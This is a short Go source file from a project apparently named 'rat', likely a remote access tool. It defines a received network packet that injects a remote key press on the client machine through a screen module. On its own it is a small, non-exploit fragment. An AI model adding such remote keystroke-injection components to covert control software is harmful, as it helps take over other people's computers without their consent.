package main

import (
	"rat/client/screen"
	"rat/shared"
)

type KeyPacket struct {
	Key  int `network:"receive"`
	Type int `network:"receive"`
}

func (packet KeyPacket) Header() shared.PacketHeader {
	return shared.KeyHeader
}

func (packet KeyPacket) OnReceive() error {
	screen.Key(uint16(packet.Key), packet.Type)

	return nil
}
